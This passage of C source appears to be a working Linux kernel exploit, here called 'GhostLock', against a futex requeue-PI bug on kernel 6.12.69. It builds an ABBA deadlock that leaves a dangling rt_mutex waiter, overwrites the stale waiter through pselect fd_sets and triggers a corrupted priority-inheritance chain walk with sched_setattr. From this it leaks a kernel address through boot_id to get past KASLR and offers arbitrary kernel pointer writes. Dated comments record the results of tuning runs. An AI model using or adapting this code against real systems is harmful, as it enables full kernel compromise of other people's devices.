  atomic_store_explicit(&slide_cow_ready, 1, memory_order_release);

  slide_route.in = in;
  slide_route.out = out;
  slide_route.ex = ex;
  /* Never retain &in: it is local to this preparation function. On the
   * normal hardened-device path UFFD is unavailable, so pselect and the
   * return marker must use the persistent copy in slide_route.in. */
  slide_route.shot_in =
      uffd_ready ? uffd_shot_in : &slide_route.in;
  slide_route.shot_out = slide_route.cow_out.set;
  slide_route.shot_ex = slide_route.cow_ex.set;
  slide_route.uffd_mapping = uffd_mapping;
  slide_route.uffd_ready = uffd_ready;
  slide_route.cow_ready = cow_ready;
  atomic_store(&slide_return_marker_addr,
               (uintptr_t)&((unsigned long *)slide_route.shot_in)
                   [SLIDE_RETURN_MARKER_WORD]);
  atomic_store(&slide_return_marker_mask, SLIDE_RETURN_MARKER_MASK);
  slide_route.ready = 1;
  pr_info("slide route ready shift=%d cow4=1 uffd=%d marker=%d\n",
          slide_word_shift_runtime, uffd_ready, slide_route.marker_fd);
  return 1;
}

static void slide_route_close(void) {
  if (!slide_route.ready) {
    return;
  }
  if (slide_route.high_read >= 0) {
    close(slide_route.high_read);
    slide_route.high_read = -1;
  }
  if (slide_route.block_fd >= 0 && slide_route.block_fd != slide_route.pipefd[0]) {
    close(slide_route.block_fd);
  }
  slide_route.block_fd = -1;
  if (slide_route.pipefd[0] >= 0) {
    close(slide_route.pipefd[0]);
    slide_route.pipefd[0] = -1;
  }
  if (slide_route.pipefd[1] >= 0) {
    close(slide_route.pipefd[1]);
    slide_route.pipefd[1] = -1;
  }
  if (slide_route.marker_pipe[0] >= 0) {
    close(slide_route.marker_pipe[0]);
    slide_route.marker_pipe[0] = -1;
  }
  if (slide_route.marker_pipe[1] >= 0) {
    close(slide_route.marker_pipe[1]);
    slide_route.marker_pipe[1] = -1;
  }
  int uffd = atomic_load(&slide_uffd_fd);
  if (uffd >= 0) {
    close(uffd);
    atomic_store(&slide_uffd_fd, -1);
  }
  if (slide_route.uffd_mapping != MAP_FAILED) {
    munmap(slide_route.uffd_mapping, PAGE_SIZE);
    slide_route.uffd_mapping = MAP_FAILED;
  }
  slide_close_cow_fdset(&slide_route.cow_out);
  slide_close_cow_fdset(&slide_route.cow_ex);
  slide_route.cow_ready = 0;
  slide_route.ready = 0;
}

/* ---------------------------------------------------------------------------
 * THE shot. Runs AFTER EDEADLK on the waiter task with the dangling
 * pi_blocked_on. Exactly ONE pselect — the preflight dry-run happened in
 * slide_prepare_route(), BEFORE the chain was built. After the single
 * pselect returns: if the route was armed, spin until the one-shot walk
 * completes. This function performs no logging, file I/O, or descriptor
 * teardown after pselect: it only snapshots the result in process memory so
 * the waiter can execute its deferred FUTEX_UNLOCK_PI immediately. */
void slide_pselect_stack_copy(void) {
  if (!slide_route.ready) {
    pr_error("slide shot route not prepared\n");
    return;
  }

  struct timespec timeout = {
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };

  int route_ready = slide_route.uffd_ready || slide_route.marker_fd >= 0;
  atomic_store(&slide_route_armed, route_ready);
  if (route_ready) {
    /* Consumer waits for either the UFFD-WP fault or the early res_in
     * marker. */
    atomic_store(&slide_consume_go, 1);
  }
  int ret = pselect(SLIDE_PSELECT_NFDS, slide_route.shot_in,
                    slide_route.shot_out, slide_route.shot_ex,
                    &timeout, NULL);
  int saved_errno = errno;
  atomic_store_explicit(&slide_pselect_returned, 1, memory_order_release);
  if (slide_route.uffd_ready) {
    memcpy(&slide_route.in, slide_route.shot_in, sizeof(fd_set));
  }
  if (slide_route.cow_ready) {
    memcpy(&slide_route.out, slide_route.shot_out, sizeof(fd_set));
    memcpy(&slide_route.ex, slide_route.shot_ex, sizeof(fd_set));
  }
  if (!route_ready || ret < 0) {
    atomic_store(&slide_route_armed, 0);
    atomic_store(&slide_consume_stop, 1);
  }
  if (atomic_load(&slide_route_armed)) {
    /* No syscall on this task until the one-shot walk consumes the resident
     * pselect frame. The consumer is already spinning on another core. */
    while (!atomic_load(&slide_consume_stop)) {
      __asm__ volatile("yield" ::: "memory");
    }
    atomic_store(&slide_consume_go, 0);
  }
  int paint_ok = 1;
  int words_per_set = slide_pselect_words_per_set();
  for (int gw = 15; gw < 6 * words_per_set; gw++) {
    uint64_t got = slide_pselect_get_global_word(
        &slide_route.in, &slide_route.out, &slide_route.ex,
        words_per_set, gw);
    int waiter_word = gw - slide_word_shift_runtime;
    if (got != slide_waiter_word_value(waiter_word)) {
      paint_ok = 0;
    }
  }
  slide_route.pselect_ret = ret;
  slide_route.pselect_errno = saved_errno;
  slide_route.paint_ok = paint_ok;
  atomic_store(&slide_paint_ok, paint_ok);
}

/* Report and release route resources from the child main thread, after the
 * waiter has completed FUTEX_UNLOCK_PI and published slide_route_done. This
 * preserves the persistent paint diagnostics without issuing syscalls from
 * the waiter while its stale stack slot may still be reachable. */
static void slide_report_route_result(void) {
  int words_per_set = slide_pselect_words_per_set();
  char ppath[128];
  if (!rmp_work_path(ppath, sizeof(ppath), "paint.log")) {
    pr_warning("slide paint file path unavailable\n");
    return;
  }
  int pfd = open(ppath, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
  if (pfd < 0) {
    pr_warning("slide paint file open FAILED path=%s errno=%d (uid=%d)\n",
               ppath, errno, getuid());
  }
  for (int gw = 15; gw < 6 * words_per_set; gw++) {
    uint64_t got = slide_pselect_get_global_word(
        &slide_route.in, &slide_route.out, &slide_route.ex,
        words_per_set, gw);
    int waiter_word = gw - slide_word_shift_runtime;
    uint64_t expect = slide_waiter_word_value(waiter_word);
    char line[128];
    int n = snprintf(line, sizeof(line),
                     "shift=%d attempt=%d gw=%d got=%016llx %s\n",
                     slide_word_shift_runtime,
                     atomic_load(&slide_attempt_no),
                     gw, (unsigned long long)got,
                     (got == expect) ? "OK" : "MISMATCH");
    if (pfd >= 0) {
      ssize_t unused = write(pfd, line, (size_t)n);
      (void)unused;
    }
    pr_info("slide paint check gw=%d got=%016llx %s\n",
            gw, (unsigned long long)got,
            (got == expect) ? "OK" : "MISMATCH");
  }
  if (pfd >= 0) {
    close(pfd);
  }
  pr_info("slide paint verdict shift=%d ok=%d (volley %s)\n",
          slide_word_shift_runtime, slide_route.paint_ok,
          slide_route.paint_ok ? "ARMED" : "SKIPPED");
  pr_info("slide pselect returned ret=%d errno=%d marker_seen=%d "
          "marker_lost=%d calls=%d sched_ok=%d last_sched_ret=%d "
          "last_sched_errno=%d hold_ready=%d hold_active=%d hold_late=%d "
          "hold_wake=%d uffd_ready=%d uffd_event=%d uffd_flags=%lx "
          "uffd_resolve=%d/%d cow4=%d\n",
          slide_route.pselect_ret, slide_route.pselect_errno,
          atomic_load(&slide_consume_seen),
          atomic_load(&slide_consume_lost),
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno),
          atomic_load(&slide_hold_ready),
          atomic_load(&slide_hold_active),
          atomic_load(&slide_hold_late),
          atomic_load(&slide_hold_wake_ret),
          atomic_load(&slide_uffd_ready),
          atomic_load(&slide_uffd_event),
          atomic_load(&slide_uffd_event_flags),
          atomic_load(&slide_uffd_resolve_ret),
          atomic_load(&slide_uffd_resolve_errno),
          slide_route.cow_ready);

  slide_route_close();
}

void *slide_return_holder_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CORE);
  atomic_store_explicit(&slide_hold_ready, 1, memory_order_release);

  /* Sleep without consuming core 0 until the consumer observes the first
   * return copy. A private futex wake makes this normal-priority task runnable
   * and therefore preempts the nice-19 waiter on the same core. */
  while (atomic_load_explicit(&slide_hold_gate, memory_order_acquire) == 0) {
    errno = 0;
    long ret = futex_op((uint32_t *)&slide_hold_gate,
                        FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0,
                        NULL, NULL, 0);
    if (ret < 0 && errno != EAGAIN && errno != EINTR) {
      atomic_store(&slide_hold_wake_ret, -errno);
    }
  }

  atomic_store(&slide_hold_late,
               atomic_load_explicit(&slide_pselect_returned,
                                    memory_order_acquire));
  atomic_store_explicit(&slide_hold_active, 1, memory_order_release);
  while (atomic_load_explicit(&slide_hold_gate, memory_order_acquire) == 1) {
    __asm__ volatile("yield" ::: "memory");
  }
  return NULL;
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  /* Trigger model (proven on 6.1/6.6 — slide61.c / slide.c): fire the
   * sched_setattr volley only while slide_consume_go is high, i.e. while
   * the pselect thread has repainted the stale rt_mutex_waiter slot on its
   * own stack (pselect + post-pselect window) and the owner is still
   * blocked on f_pi_chain. Firing earlier (during the waiter's
   * WAIT_REQUEUE_PI block) hits the REAL, still-unpainted waiter node and
   * can never corrupt boot_id. */
  while (!atomic_load(&slide_consume_go)) {
    __asm__ volatile("yield" ::: "memory");
    if (atomic_load(&slide_consume_stop)) {
      return NULL;
    }
  }  int uffd = atomic_load_explicit(&slide_uffd_fd, memory_order_acquire);
  uintptr_t uffd_page = atomic_load(&slide_uffd_page);
  int uffd_fault = 0;
  if (uffd >= 0 && atomic_load(&slide_uffd_ready)) {
    /* pselect is blocked inside the write-protect fault until we clear WP
     * below. Polling is bounded so a malformed/missing event fails closed. */
    for (int poll_no = 0; poll_no < 50 && !uffd_fault; poll_no++) {
      struct pollfd pfd = {.fd = uffd, .events = POLLIN};
      int pret = poll(&pfd, 1, 100);
      if (pret < 0 && errno == EINTR) {
        continue;
      }
      if (pret <= 0 || !(pfd.revents & POLLIN)) {
        continue;
      }
      struct uffd_msg msg;
      ssize_t n = read(uffd, &msg, sizeof(msg));
      if (n == (ssize_t)sizeof(msg) &&
          msg.event == UFFD_EVENT_PAGEFAULT &&
          (msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WP) &&
          (msg.arg.pagefault.address & ~(uintptr_t)(PAGE_SIZE - 1)) ==
              uffd_page) {
        atomic_store(&slide_uffd_event, 1);
        atomic_store(&slide_uffd_event_flags,
                     (unsigned long)msg.arg.pagefault.flags);
        atomic_store(&slide_consume_seen, 1);
        uffd_fault = 1;
      } else {
        atomic_store(&slide_consume_lost, 1);
        break;
      }
    }
  } else {
    uintptr_t marker_addr = atomic_load(&slide_return_marker_addr);
    unsigned long marker_mask = atomic_load(&slide_return_marker_mask);
    if (marker_addr && marker_mask) {
      volatile unsigned long *marker =
          (volatile unsigned long *)marker_addr;
      while ((__atomic_load_n(marker, __ATOMIC_ACQUIRE) & marker_mask) != 0) {
        __asm__ volatile("yield" ::: "memory");
        if (atomic_load(&slide_consume_stop)) {
          atomic_store(&slide_consume_lost, 1);
          return NULL;
        }
      }
      atomic_store(&slide_consume_seen, 1);
    }

    /* Do not wake the same-core holder here. Test (15) showed that its wakeup
     * completes only after syscall exit, when waiter->lock is already gone.
     * The four later COW faults are now the only accepted marker window. */
  }

  int tid = atomic_load(&slide_waiter_tid);
  int cow_window = !uffd_fault &&
                   atomic_load_explicit(&slide_cow_ready,
                                        memory_order_acquire) &&
                   atomic_load_explicit(&slide_consume_seen,
                                        memory_order_acquire) &&
                   !atomic_load_explicit(&slide_pselect_returned,
                                         memory_order_acquire);
  int route_safe = atomic_load(&slide_waiter_lowprio) &&
                   (uffd_fault || cow_window);
  if (tid && atomic_load(&slide_route_armed) && route_safe) {
    atomic_store(&slide_consume_enter_sched, 1);
    int calls = atomic_load(&slide_consume_calls);
    atomic_store(&slide_consume_calls, calls + 1);
    /* Never fire a no-op: a sched_setattr that does not change the
     * victim's effective priority/policy returns 0 without running
     * rt_mutex_adjust_pi at all (the "sched_ok but silent" losses of the
     * 2026-09-03 run4). Cycle nice 1..19 so the change is always real.
     * No getattr or logging is allowed before this syscall: run10 proved
     * that even diagnostic work can outlive the COW4 return window and make
     * the walk observe waiter->lock == NULL. */
    int fire_nice = (calls % 19) + 1;
    errno = 0;
    long ret = sched_setattr_tid(tid, fire_nice);
    int saved_errno = errno;
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      atomic_store(&slide_consume_sched_ok, 1);
    }
    pr_info("slide consumer shot tid=%d fire_nice=%d setattr_ret=%ld "
            "errno=%d shift=%d\n",
            tid, fire_nice, ret, saved_errno, slide_word_shift_runtime);
  }
  if (uffd >= 0 && uffd_page) {
    slide_resolve_uffd_wp(uffd, uffd_page);
  }
  atomic_store(&slide_consume_stop, 1);
  return NULL;
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CORE);

  /* 2026-09-05 rework: prepare EVERYTHING (proto, fdsets, preflight,
   * marker, COW, UFFD) BEFORE the vulnerable chain exists. A failure here
   * leaves PI state fully consistent — _exit(9) is safe. */
  if (!slide_prepare_route()) {
    pr_error("slide route preparation failed; aborting before chain\n");
    _exit(9);
  }

  errno = 0;
  int nice_ret = setpriority(PRIO_PROCESS, 0, 19);
  int nice_errno = errno;
  atomic_store(&slide_waiter_lowprio, nice_ret == 0);
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);
  pr_info("slide waiter scheduling tid=%d nice19_ret=%d errno=%d "
          "holder_ready=%d\n",
          tid, nice_ret, nice_errno, atomic_load(&slide_hold_ready));

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_nsec += SLIDE_WAIT_MSEC * 1000000L;
  if (timeout.tv_nsec >= 1000000000L) {
    timeout.tv_sec++;
    timeout.tv_nsec -= 1000000000L;
  }

  atomic_store(&slide_waiter_waiting, 1);
  pr_info("slide waiter entering WAIT_REQUEUE_PI tid=%d\n", tid);

  /* SYNC: the consumer fires only while consume_go is high — i.e. during
   * the pselect route below, after this thread has left WAIT_REQUEUE_PI
   * and repainted the stale rt_waiter slot. Order: requeue → owner
   * blocks on chain → pselect paints → consumer walk.
   *
   * On 6.12.69 (pre-fix for 3bfdc63936dd), the requeue closes the ABBA
   * cycle and rt_mutex_start_proxy_lock (running on the REQUEUER, i.e.
   * the main thread) detects the deadlock. remove_waiter() then zeroes
   * REQUEUER->pi_blocked_on (= current on the requeuer thread) instead
   * of the waiter's, leaving the WAITER task with a dangling
   * pi_blocked_on pointing at the rt_waiter that rt_mutex_start_proxy_
   * lock had just placed on the waiter's stack (then dequeued in the
   * remove_waiter rollback). The waiter wakes from WAIT_REQUEUE_PI with
   * EDEADLK, but pi_blocked_on on the waiter is still non-NULL.
   *
   * The pselect route + consume_go volley then walks that dangling
   * pointer, reads the (repainted) fake waiter fields, and lands the
   * leak write. So the route must run for ALL three WAIT_REQUEUE_PI
   * outcomes: success (RT_MUTEX_FULL_CHAINWALK requeue on 6.1/6.6),
   * ETIMEDOUT, and EDEADLK (the GhostLock path on 6.12.69). */
  long wret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                       &slide_f_pi_target, 0);
  int werr = errno;
  pr_info("slide waiter WAIT_REQUEUE_PI returned ret=%ld errno=%d (ETIMEDOUT=%d EDEADLK=%d)\n",
          wret, werr, ETIMEDOUT, EDEADLK);

  /* 2026-09-05 (run7): DO NOT unlock f_pi_chain before the pselect route.
   * The 6.12 walk has an early-exit guard that 6.6 lacks:
   *   rt_mutex_adjust_prio_chain+0x58a0: ldr x8,[task,#0xa00]  (pi_waiters)
   *                                      cbz x8 → clean exit, NO rb_erase.
   * Unlocking f_pi_chain here hands ownership to the owner and dequeues
   * its node, EMPTYING task->pi_waiters → every shot exited silently
   * (zero panics, zero writes, boot_id untouched — run6/run7). Keeping
   * f_pi_chain held leaves the owner's node in pi_waiters so the walk
   * proceeds to the erase and lands the leak write (verified against the
   * disasm: erase → [bootid]=tree_pc, [loggers+8]=bootid, then
   * insert-as-child-of-sentinel → clean ownerless exit at +0x5f78). The
   * unlock is DEFERRED to after slide_pselect_stack_copy() below — the
   * official blazer PoC unlocks early only because 6.6 has no such guard. */

  /* IMPORTANT: the pselect route MUST run on THIS SAME THREAD.
   * The stale rb pointer left in f_pi_target.waiters points at the
   * absolute address of the OLD rt_waiter inside THIS task's kernel
   * stack; only a pselect executed by this task repaints that exact
   * stack region with the fake waiter words (res_* mechanism). A
   * dedicated route thread would paint ITS OWN stack — never overlaying
   * the stale address.
   *
   * This is the ONLY pselect after EDEADLK (the dry-run preflight ran in
   * slide_prepare_route() before the chain was built). */
  slide_pselect_stack_copy();

  /* Deferred unlock — f_pi_chain must stay owned by THIS task
   * (pi_waiters non-empty) for the whole shot. NOW the shot is over:
   * unlock restores a CONSISTENT PI state (the owner finally acquires
   * f_pi_chain) and consumes the walk handle. Once it succeeds, publish
   * route_done and park in userspace until the
   * child main has reported the result and terminates the process group. */
  long uret = futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  pr_info("slide waiter deferred UNLOCK_PI ret=%ld errno=%d\n",
          uret, uret < 0 ? errno : 0);
  atomic_store(&slide_route_done, 1);
  for (;;) {
    __asm__ volatile("yield" ::: "memory");
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  /* Block on the chain lock NOW, before the main thread's requeue. The
   * resulting graph is: waiter owns f_pi_chain and is about to be
   * requeued to f_pi_target (owned by us, the owner); we then try to
   * lock f_pi_chain (owned by the waiter). That closes an ABBA cycle
   * which is exactly the deadlock the GhostLock primitive needs.
   *
   * FUTEX_LOCK_PI on f_pi_chain may legitimately return -EDEADLK when
   * the proxy-lock detector (rt_mutex_start_proxy_lock -> task_blocks_on
   * _rt_mutex -> chain walk) races the requeue; we ignore the return and
   * either sleep in the futex wait (if the requeue hasn't happened yet)
   * or remain blocked on the chain (if it has). What matters is that
   * by the time the requeue runs, we are EITHER still trying to acquire
   * the chain OR already blocked on it — either way the cycle is live. */
  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

int slide_read_bootid_raw(uint64_t *lo, uint64_t *hi) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t raw_lo = 0;
  uint64_t raw_hi = 0;
  for (int i = 0; i < 8; i++) {
    raw_lo |= (uint64_t)raw[i] << (i * 8);
    raw_hi |= (uint64_t)raw[i + 8] << (i * 8);
  }
  if (lo) {
    *lo = raw_lo;
  }
  if (hi) {
    *hi = raw_hi;
  }
  return 1;
}

uint64_t slide_read_stext(void) {
  uint64_t leaked = 0;
  if (!slide_read_bootid_raw(&leaked, NULL)) {
    return 0;
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx "
             "stext=%016llx word_shift=%d\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext,
             slide_word_shift_runtime);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t holder;
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;

  /* Reset handshakes each attempt. (slide_owner_go removed: the owner
   * thread now blocks on f_pi_chain before the requeue, so that the
   * requeue sees the ABBA cycle and returns -EDEADLK — which on
   * 6.12.69 pre-fix leaves waiter->pi_blocked_on dangling as the
   * GhostLock primitive requires.)
   *
   * 2026-09-05 rework: slide_prepare_route() runs INSIDE the waiter
   * thread BEFORE it locks f_pi_chain — every failure there _exit(9)s
   * with PI state still consistent, so no handshake for it is needed
   * here. */
  atomic_store(&slide_waiter_ready, 0);
  atomic_store(&slide_waiter_waiting, 0);
  atomic_store(&slide_owner_started, 0);
  atomic_store(&slide_route_done, 0);
  atomic_store(&slide_waiter_tid, 0);
  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_route_armed, 0);
  atomic_store(&slide_return_marker_addr, 0);
  atomic_store(&slide_return_marker_mask, 0);
  atomic_store(&slide_pselect_returned, 0);
  atomic_store(&slide_hold_gate, 0);
  atomic_store(&slide_hold_ready, 0);
  atomic_store(&slide_hold_active, 0);
  atomic_store(&slide_hold_late, 0);
  atomic_store(&slide_hold_wake_ret, -1);
  atomic_store(&slide_waiter_lowprio, 0);
  atomic_store(&slide_uffd_fd, -1);
  atomic_store(&slide_uffd_page, 0);
  atomic_store(&slide_uffd_ready, 0);
  atomic_store(&slide_uffd_event, 0);
  atomic_store(&slide_uffd_event_flags, 0);
  atomic_store(&slide_uffd_setup_errno, 0);
  atomic_store(&slide_uffd_resolve_ret, -1);
  atomic_store(&slide_uffd_resolve_errno, 0);
  atomic_store(&slide_cow_ready, 0);

  SYSCHK(pthread_create(&holder, NULL, slide_return_holder_thread, NULL));
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started) ||
         !atomic_load(&slide_hold_ready)) {
    usleep(1000);
  }

  errno = 0;
  /* The requeue's intended outcome on the GhostLock path is -EDEADLK
   * (the ABBA cycle is closed: waiter owns f_pi_chain, owner holds
   * f_pi_target, owner is blocked on f_pi_chain). rt_mutex_start_proxy_
   * lock on the requeuer thread detects the deadlock, calls
   * remove_waiter() — which on 6.12.69 pre-fix 3bfdc63936dd zeroes
   * current->pi_blocked_on (= requeuer) instead of waiter->pi_blocked_on,
   * leaving the waiter with a dangling pi_blocked_on.
   *
   * So we DO NOT retry on EDEADLK: a single -EDEADLK is the desired
   * outcome. Other errors (e.g. EFAULT on the uaddr) are real failures
   * and we do retry, but the retry budget is kept small because the
   * race window between FUTEX_WAIT_REQUEUE_PI on the waiter and
   * FUTEX_CMP_REQUEUE_PI here is very tight on 6.12. */
  long rret = -1;
  int rerr = 0;
  for (int retry = 0; retry < 200; retry++) {
    errno = 0;
    rret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                    &slide_f_pi_target, 0);
    rerr = errno;
    if (rret < 0 && rerr == EDEADLK) {
      break;
    }
    /* 0 means the waiter set the userspace handshake but has not reached
     * futex_wait_queue() yet. EAGAIN is likewise a retryable race. A positive
     * result would be a real requeue, not the vulnerable deadlock path. */
    if (rret != 0 && !(rret < 0 && rerr == EAGAIN)) {
      break;
    }
    usleep(1000);
  }
  pr_info("slide requeue ret=%ld errno=%d (ETIMEDOUT=%d EDEADLK=%d) waiter_waiting=%d owner_started=%d\n",
          rret, rerr, ETIMEDOUT, EDEADLK,
          atomic_load(&slide_waiter_waiting),
          atomic_load(&slide_owner_started));
  if (!(rret < 0 && rerr == EDEADLK)) {
    pr_warning("slide requeue missed required EDEADLK ret=%ld errno=%d\n",
               rret, rerr);
    return 0;
  }
  /* On EDEADLK: rt_mutex_start_proxy_lock has already run on the
   * requeuer and set waiter->pi_blocked_on (then remove_waiter left it
   * dangling pre-fix). The waiter is still sleeping in futex_wait_queue
   * (futex_requeue_pi_complete() sets Q_REQUEUE_PI_NONE and does NOT wake
   * it). FUTEX_WAKE is invalid for a WAIT_REQUEUE_PI waiter and returned
   * EINVAL in the tester log. Let the 500 ms absolute timer wake it:
   * wakeup_sync changes NONE->IGNORE and handle_early_requeue_pi_wakeup()
   * unqueues q without cleaning the dangling task->pi_blocked_on. */
  pr_info("slide timeout-wake armed deadline_ms=%d tid=%d\n",
          SLIDE_WAIT_MSEC, atomic_load(&slide_waiter_tid));
  /* Give the waiter a moment to enter the pselect route. */
  usleep(100000);

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }

  /* The waiter has completed its deferred unlock and is parked in userspace;
   * diagnostics and route teardown are safe on this main thread now. */
  slide_report_route_result();
  if (slide_direct_write_mode) {
    int fired = atomic_load(&slide_consume_sched_ok) > 0 &&
                atomic_load(&slide_paint_ok);
    pr_info("ghostlock direct route fired=%d target=%016zx value=%016zx\n",
            fired, slide_direct_target, slide_direct_value);
    return fired ? 1 : 0;
  }
  return slide_read_stext();
}

static int ghostlock_write_pointer_shape(
    uintptr_t target, uintptr_t value, enum slide_direct_shape shape) {
  if (!is_direct_ptr(target) || (value && !is_direct_ptr(value)) ||
      (target & 7) || (value && (value & 7)) ||
      (shape == SLIDE_DIRECT_LEFT_CHILD && !value)) {
    pr_warning("ghostlock direct rejected shape=%s target=%016zx "
               "value=%016zx\n",
               shape == SLIDE_DIRECT_LEFT_CHILD ? "left" : "right",
               target, value);
    return 0;
  }

  slide_direct_write_mode = shape;
  slide_direct_target = target;
  slide_direct_value = value;
  slide_word_shift_runtime = SLIDE_PSELECT_WORD_SHIFT;
  /* Every direct-write caller prepares PAGE_PAYLOAD_FOPS immediately before
   * entering here. Use its ownerless sentinel lock while that spray is live. */
  slide_fake_lock_runtime = fake_lock;
  if (!page_base || !slide_fake_lock_runtime || !fake_w0) {
    slide_direct_write_mode = SLIDE_DIRECT_NONE;
    return 0;
  }
  slide_fake_lock_serial++;
  atomic_store(&slide_attempt_no, 1000 + (int)slide_fake_lock_serial);

  int fds[2];
  if (pipe(fds) != 0) {
    slide_direct_write_mode = SLIDE_DIRECT_NONE;
    return 0;
  }
  pid_t child = fork();
  if (child == 0) {
    close(fds[0]);
    disable_rseq_for_thread();
    uint64_t fired = slide_child_leak_stext();
    if (fired) {
      ssize_t unused = write(fds[1], &fired, sizeof(fired));
      (void)unused;
    }
    _exit(fired ? 0 : 1);
  }
  close(fds[1]);
  if (child < 0) {
    close(fds[0]);
    slide_direct_write_mode = SLIDE_DIRECT_NONE;
    return 0;
  }

  uint64_t fired = 0;
  struct pollfd pfd = {.fd = fds[0], .events = POLLIN};
  int pret = poll(&pfd, 1, 15000);
  ssize_t n = pret > 0 ? read(fds[0], &fired, sizeof(fired)) : -1;
  close(fds[0]);
  if (pret <= 0) {
    kill(child, SIGKILL);
  }
  int status = 0;
  while (waitpid(child, &status, 0) < 0 && errno == EINTR) {
  }
  int ok = n == (ssize_t)sizeof(fired) && fired &&
           WIFEXITED(status) && WEXITSTATUS(status) == 0;
  if (shape == SLIDE_DIRECT_LEFT_CHILD) {
    pr_info("ghostlock direct result triggered=%d shape=left target=%016zx "
            "value=%016zx side_effect=%016zx|%016zx lock=%016zx status=%d\n",
            ok, target, value, value + 8, value + 16,
            slide_fake_lock_runtime, status);
  } else {
    pr_info("ghostlock direct result triggered=%d shape=right target=%016zx "
            "value=%016zx side_effect=%016zx lock=%016zx status=%d\n",
            ok, target, value, value, slide_fake_lock_runtime, status);
  }
  slide_direct_write_mode = SLIDE_DIRECT_NONE;
  slide_direct_target = 0;
  slide_direct_value = 0;
  return ok;
}

int ghostlock_write_pointer(uintptr_t target, uintptr_t value) {
  return ghostlock_write_pointer_shape(
      target, value, SLIDE_DIRECT_RIGHT_CHILD);
}

int ghostlock_write_pointer_left(uintptr_t target, uintptr_t value) {
  return ghostlock_write_pointer_shape(
      target, value, SLIDE_DIRECT_LEFT_CHILD);
}

int slide_leak_kernel_base(void) {
  /* 2026-09-05 (run9 post-mortem): sweep RETIRED. Shift 18 was right all
   * along — the run3/4 panic registers (x25/x24 == exact fake_lock,
   * x21 == exact fake_w0) prove the runtime paint was as expected, and
   * the sweep only painted malformed waiters until one entered rcub/0's
   * RT chain. The real battle is the walk arming/window, not geometry. */
  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    slide_word_shift_runtime = SLIDE_PSELECT_WORD_SHIFT;
    slide_direct_write_mode = SLIDE_DIRECT_NONE;
    atomic_store(&slide_attempt_no, attempt);
    pr_info("slide attempt %d word_shift=%d (fixed exact geometry)\n",
            attempt, slide_word_shift_runtime);

    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock || !fake_w0) {
      continue;
    }
    slide_fake_lock_runtime = fake_lock;

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
